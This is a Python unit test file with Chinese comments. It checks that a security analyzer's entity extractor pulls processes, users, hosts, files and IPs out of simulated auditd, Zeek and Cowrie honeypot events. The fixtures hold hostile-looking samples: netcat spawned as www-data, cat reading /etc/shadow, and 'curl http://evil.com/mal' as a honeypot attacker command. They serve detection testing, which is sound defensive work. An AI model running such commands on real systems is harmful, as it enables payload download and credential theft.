import unittest
import sys
import os

# 将项目根目录添加到 Python 路径，确保能找到 analyzer 包
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# ✅ 修正导入路径：从 analyzer.graph_analyzer 包导入
try:
    from analyzer.graph_analyzer.entity_extractor import EntityExtractor
except ImportError:
    # 兼容性处理：如果用户错误地把文件放在了根目录，尝试直接导入
    try:
        from entity_extractor import EntityExtractor
    except ImportError:
        print("❌ 错误: 找不到 entity_extractor.py。请确保它位于 analyzer/graph_analyzer/ 目录下。")
        sys.exit(1)

class TestEntityExtractorCoverage(unittest.TestCase):
    def setUp(self):
        self.extractor = EntityExtractor()

    # ==========================================
    # 📌 第一部分：测试组员 1 (主机安全) 数据覆盖
    # ==========================================

    def test_host_auditd_process_spawn(self):
        """测试主机进程创建事件 (Process + Parent Process + User)"""
        print("\n🔍 [Entity] 测试 Host: 进程父子链提取...")
        event = {
            "@timestamp": "2026-01-14T10:00:00Z",
            "process": {
                "name": "netcat",
                "pid": 12345,
                "executable": "/usr/bin/nc",
                "parent": {
                    "name": "bash",
                    "pid": 11000
                }
            },
            "user": {
                "name": "www-data"
            },
            "host": {
                "name": "web-server-01"
            }
        }
        
        entities = self.extractor.extract(event)
        
        # 验证提取到的实体 ID
        entity_ids = [e["id"] for e in entities]
        print(f"   提取结果: {entity_ids}")
        
        self.assertIn("process:netcat:12345", entity_ids, "❌ 丢失子进程实体")
        self.assertIn("process:bash:11000", entity_ids, "❌ 丢失父进程实体")
        self.assertIn("user:www-data", entity_ids, "❌ 丢失用户实体")
        self.assertIn("host:web-server-01", entity_ids, "❌ 丢失主机实体")
        print("   ✅ Host Process Spawn 覆盖验证通过")

    def test_host_auditd_file_access(self):
        """测试主机文件操作事件 (Process + File)"""
        print("\n🔍 [Entity] 测试 Host: 文件操作提取...")
        event = {
            "process": {
                "name": "cat",
                "pid": 9999
            },
            "file": {
                "path": "/etc/shadow"
            }
        }
        
        entities = self.extractor.extract(event)
        entity_ids = [e["id"] for e in entities]
        print(f"   提取结果: {entity_ids}")

        self.assertIn("file:/etc/shadow", entity_ids, "❌ 丢失文件实体")
        self.assertIn("process:cat:9999", entity_ids, "❌ 丢失操作进程实体")
        print("   ✅ Host File Access 覆盖验证通过")

    # ==========================================
    # 📌 第二部分：测试组员 2 (网络安全) 数据覆盖
    # ==========================================

    def test_network_zeek_conn(self):
        """测试 Zeek 流量日志 (Source IP + Dest IP)"""
        print("\n🔍 [Entity] 测试 Network: Zeek 连接提取...")
        # 模拟 Zeek conn.log 格式
        event = {
            "source": {"ip": "192.168.1.100"},
            "destination": {"ip": "114.114.114.114"},
            "network": {"protocol": "dns"}
        }
        
        entities = self.extractor.extract(event)
        entity_ids = [e["id"] for e in entities]
        print(f"   提取结果: {entity_ids}")

        self.assertIn("ip:192.168.1.100", entity_ids, "❌ 丢失源 IP")
        self.assertIn("ip:114.114.114.114", entity_ids, "❌ 丢失目的 IP")
        
        # 验证角色 (Role)
        src_entity = next(e for e in entities if e["value"] == "192.168.1.100")
        self.assertEqual(src_entity["role"], "source", "❌ 源 IP 角色标记错误")
        print("   ✅ Zeek Conn 覆盖验证通过")

    def test_network_cowrie_attacker(self):
        """测试 Cowrie 蜜罐攻击者 (Attacker IP + Command Process)"""
        print("\n🔍 [Entity] 测试 Network: Cowrie 蜜罐提取...")
        # 模拟 Cowrie 攻击者执行命令: curl http://evil.com
        event = {
            "source": {"ip": "59.64.129.102"}, # 攻击者 IP
            "process": {
                "name": "curl",
                "pid": 0, # Cowrie 通常没有真实 PID，或者为 0
                "command_line": "curl http://evil.com/mal"
            },
            "host": {"name": "honey-pot-01"}
        }
        
        entities = self.extractor.extract(event)
        entity_ids = [e["id"] for e in entities]
        print(f"   提取结果: {entity_ids}")

        self.assertIn("ip:59.64.129.102", entity_ids, "❌ 丢失攻击者 IP")
        # Cowrie 模拟的进程也应该被提取
        self.assertIn("process:curl:0", entity_ids, "❌ 丢失蜜罐模拟进程") 
        self.assertIn("host:honey-pot-01", entity_ids, "❌ 丢失蜜罐主机实体")
        print("   ✅ Cowrie Command 覆盖验证通过")

if __name__ == '__main__':
    unittest.main()
